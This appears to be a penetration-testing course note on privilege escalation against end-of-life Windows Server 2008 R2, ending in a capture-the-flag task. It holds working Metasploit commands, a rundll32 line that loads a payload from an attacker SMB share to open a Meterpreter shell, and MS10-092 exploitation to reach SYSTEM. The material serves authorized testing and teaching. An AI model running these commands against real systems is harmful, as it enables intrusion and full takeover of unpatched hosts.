# Windows Server 2008 / 2008 R2

Windows Server 2008 and 2008 R2 reached **End-of-Life on January 14, 2020**. Despite this, they still exist across many enterprise environments, particularly in medical, academic, and local government networks. These legacy systems often serve mission-critical roles, and due to lack of updates, are vulnerable to multiple local and remote privilege escalation flaws.
## Feature Comparison with Newer Versions

|Feature|Server 2008 R2|Server 2012 R2|Server 2016|Server 2019|
|---|---|---|---|---|
|Enhanced Windows Defender ATP||||✅|
|Just Enough Administration|Partial|Partial|✅|✅|
|Credential Guard|||✅|✅|
|Remote Credential Guard|||✅|✅|
|Device Guard (Code Integrity)|||✅|✅|
|AppLocker|Partial|✅|✅|✅|
|Windows Defender|Partial|Partial|✅|✅|
|Control Flow Guard|||✅|✅|
## Why This Matters

Many organizations retain these systems due to:

- Legacy vendor lock-in (e.g., MRI, billing software)    
- No budget for upgrades
- Forgotten or shadow IT
- Mission-critical operations

Your approach during an assessment must consider the system’s operational role. Blindly exploiting fragile systems may result in downtime. Always **consult the client before exploitation**.
## Enumeration Techniques
### Using WMI to Check Installed Patches

```cmd
wmic qfe
```

Example output:

```
HotFixID      InstalledOn
KB2533552     3/31/2021
```

Use Google or the Microsoft KB to verify patch relevance. A lack of recent KBs indicates outdated, likely vulnerable systems.
## Using Sherlock

[https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Sherlock will attempt to identify privilege escalation vulnerabilities based on kernel version.
## Sample Vulnerabilities Found

```text
MS10-092 - Task Scheduler .XML -> Appears Vulnerable
MS15-051 - ClientCopyImage Win32k -> Appears Vulnerable
MS16-032 - Secondary Logon Handle -> Appears Vulnerable
```

Use exploit-db links or Metasploit modules for exploitation.
## Gaining Access – SMB Delivery + MS10-092
### 1. Create Payload Delivery

```bash
msf6 > use exploit/windows/smb/smb_delivery
set LHOST 10.10.14.3
set LPORT 4444
set target 0
run
```
### 2. Execute on Target

```cmd
rundll32.exe \\10.10.14.3\share\payload.dll,0
```

This triggers a **Meterpreter shell**.
## 3. Local Privilege Escalation (MS10-092)

```bash
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST 10.10.14.3
set LPORT 4443
run
```

If using a 32-bit shell, **migrate to a 64-bit process**:

```bash
meterpreter > ps
meterpreter > migrate <x64 PID>
```

Upon successful exploitation, you should see:

```text
Server username: NT AUTHORITY\SYSTEM
OS              : Windows 2008 R2
```
## Reporting Notes

When assessing such systems:

- Clearly explain why they’re vulnerable.    
- Provide specific upgrade recommendations.
- Where upgrades are not possible, **suggest mitigation**:
    - Network segmentation
    - Logging and monitoring    
    - Application allowlisting    
    - EDR tooling (if supported)
## Practice Scenario

You encounter a Server 2008 R2 host with no recent patches. Use **any available vulnerability (e.g., MS10-092)** to escalate to SYSTEM. Repeat the process with multiple techniques if possible, and capture the `flag.txt` from `C:\Users\Administrator\Desktop`.
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #LegacyOS